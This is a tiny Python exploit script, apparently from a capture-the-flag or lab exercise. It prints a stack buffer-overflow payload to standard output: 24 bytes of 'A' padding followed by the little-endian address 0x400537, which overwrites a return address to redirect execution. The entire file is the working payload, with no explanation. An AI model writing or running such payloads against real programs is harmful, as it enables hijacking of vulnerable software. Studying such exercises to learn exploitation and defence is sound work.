#!/usr/bin/env python3

import sys


oflow = b'A' * 24

exploit = bytearray(oflow)
func=0x400537
exploit.extend(func.to_bytes(8, byteorder='little'))
sys.stdout.buffer.write(exploit)


